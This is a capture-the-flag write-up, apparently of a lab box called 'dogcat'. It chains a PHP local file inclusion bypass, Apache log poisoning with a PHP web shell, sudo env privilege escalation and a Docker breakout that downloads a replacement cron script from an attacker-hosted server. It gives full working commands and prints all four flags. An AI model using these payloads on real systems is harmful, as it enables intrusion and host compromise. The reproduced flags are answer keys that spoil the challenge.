# Dogcat CTF Writeup
(*solved using gemini 🤖🤖🤖*)

This is a detailed writeup for the "dogcat" CTF challenge, which involves exploiting a PHP Local File Inclusion (LFI) vulnerability to achieve Remote Code Execution (RCE), escalating privileges within a Docker container, and finally breaking out of the container to the host machine.

## Reconnaissance

Initial enumeration started with an Nmap scan to identify open ports and services on the target IP (`10.48.154.222`).

```bash
nmap -sV -sC -Pn 10.48.154.222
```

The scan revealed two open ports:
*   **Port 22:** OpenSSH 7.6p1 Ubuntu
*   **Port 80:** Apache httpd 2.4.38 (Debian)

Navigating to the web server on Port 80 presented a simple webpage allowing the user to view images of dogs or cats by clicking buttons, which appended a `?view=` parameter to the URL (e.g., `/?view=dog`).

## Exploiting LFI (Flag 1)

Testing the `view` parameter by supplying an invalid value like `/?view=test` resulted in the error message: "Sorry, only dogs or cats are allowed." This indicated a filter was in place.

To understand the application logic, I attempted to read the source code of `index.php` using the PHP filter wrapper. The filter required the string "dog" or "cat" to be present, so I constructed a payload that included the keyword "dog" but navigated out of the current directory to target `index.php`.

```bash
curl -s "http://10.48.154.222/?view=php://filter/convert.base64-encode/resource=dog/../index"
```

Decoding the Base64 output revealed the underlying PHP logic:

```php
<?php
    function containsStr($str, $substr) {
        return strpos($str, $substr) !== false;
    }
    $ext = isset($_GET["ext"]) ? $_GET["ext"] : '.php';
    if(isset($_GET['view'])) {
        if(containsStr($_GET['view'], 'dog') || containsStr($_GET['view'], 'cat')) {
            echo 'Here you go!';
            include $_GET['view'] . $ext;
        } else {
            echo 'Sorry, only dogs or cats are allowed.';
        }
    }
?>
```

The code confirmed the LFI vulnerability. It checks if "dog" or "cat" is in the `view` parameter, and if so, it includes the file. Crucially, it appends an extension (`$ext`), which defaults to `.php`, but this can be controlled via an `&ext=` URL parameter. 

By passing an empty `ext` parameter, I could read arbitrary files, bypassing the `.php` extension enforcement. I first tested this by reading `/etc/passwd`:

```bash
curl -s "http://10.48.154.222/?view=dog/../../../../etc/passwd&ext="
```

Knowing there was a `flag.php` file based on typical CTF conventions, I read its source code using the same Base64 filter bypass:

```bash
curl -s "http://10.48.154.222/?view=php://filter/convert.base64-encode/resource=dog/../flag"
```

Decoding the output provided **Flag 1**:
`THM{Th1s_1s_N0t_4_Catdog_ab67edfa}`

## Log Poisoning to RCE (Flag 2)

To escalate the LFI to RCE, I utilized Apache Log Poisoning. First, I verified that the Apache access log was readable:

```bash
curl -s "http://10.48.154.222/?view=dog/../../../../var/log/apache2/access.log&ext="
```

After confirming access, I injected a simple PHP web shell into the log file by making a request with a crafted `User-Agent` header:

```bash
curl -s -H "User-Agent: <?php system(\$_GET['cmd']); ?>" "http://10.48.154.222/"
```

With the shell injected, I could now execute arbitrary commands by including the log file and passing commands via the `cmd` parameter:

```bash
curl -s "http://10.48.154.222/?view=dog/../../../../var/log/apache2/access.log&ext=&cmd=id"
```
*Output: `uid=33(www-data) gid=33(www-data) groups=33(www-data)`*

I then searched the web directory for the second flag:

```bash
curl -s "http://10.48.154.222/?view=dog/../../../../var/log/apache2/access.log&ext=&cmd=ls+/var/www"
```

This revealed `flag2_QMW7JvaY2LvK.txt`. Reading it yielded **Flag 2**:
`THM{LF1_t0_RC3_aec3fb}`

## Privilege Escalation in Docker (Flag 3)

With a low-privileged shell as `www-data`, I checked for sudo permissions:

```bash
curl -s "http://10.48.154.222/?view=dog/../../../../var/log/apache2/access.log&ext=&cmd=sudo+-l"
```

The output indicated that `www-data` could run `/usr/bin/env` as root without a password:
`User www-data may run the following commands on f504fb101fc4: (root) NOPASSWD: /usr/bin/env`

This allowed for trivial privilege escalation to root within the container:

```bash
curl -s "http://10.48.154.222/?view=dog/../../../../var/log/apache2/access.log&ext=&cmd=sudo+env+/bin/sh+-c+'cat+/root/flag3.txt'"
```

This returned **Flag 3**:
`THM{D1ff3r3nt_3nv1ronments_874112}`

## Docker Breakout (Flag 4)

To find the final flag, I needed to break out of the Docker container. Inspecting the container's root file system revealed an unusual directory: `/opt/backups/`. Inside was a script named `backup.sh` and a `backup.tar` archive. 

Checking the contents of `backup.sh`:
```bash
#!/bin/bash
tar cf /root/container/backup/backup.tar /root/container
```

The script was creating a tar archive of `/root/container`. Because the file was updating periodically, it was evident that a cron job *on the host machine* was executing this script. Since the script was running as root on the host and was located within a volume mounted to the container (`/opt/backups` inside the container maps to `/root/container/backup/` on the host, or similar), I could modify `backup.sh` from within the container to execute commands on the host.

Instead of trying to catch a reverse shell (which was unreliable due to character encoding issues through the LFI payload), I updated `backup.sh` to find `flag4.txt` on the host filesystem and copy its contents into the shared backup directory, making it readable from the container.

To bypass URL encoding issues with complex bash scripts via `curl`, I hosted the payload script locally:

1.  **Create `payload.sh` locally:**
    ```bash
    echo "#!/bin/bash" > payload.sh
    echo "find / -name flag4* -exec cat {} + > /root/container/backup/flag4.txt" >> payload.sh
    echo "chmod 777 /root/container/backup/flag4.txt" >> payload.sh
    chmod +x payload.sh
    ```

2.  **Host the script:**
    ```bash
    python3 -m http.server 8000
    ```

3.  **Force the container to download and replace `backup.sh`:**
    ```bash
    curl -s "http://10.48.154.222/?view=dog/../../../../var/log/apache2/access.log&ext=&cmd=sudo+env+/bin/sh+-c+'curl+http://192.168.131.247:8000/payload.sh+-o+/opt/backups/backup.sh'"
    ```

After waiting a minute for the host's cron job to trigger the modified script, the flag file was copied to the shared volume. I then read it using the existing LFI-RCE:

```bash
curl -s "http://10.48.154.222/?view=dog/../../../../opt/backups/flag4.txt&ext="
```

This successfully retrieved **Flag 4**:
`THM{esc4l4tions_on_esc4l4tions_on_esc4l4tions_7a52b17dba6ebb0dc38bc1049bcba02d}`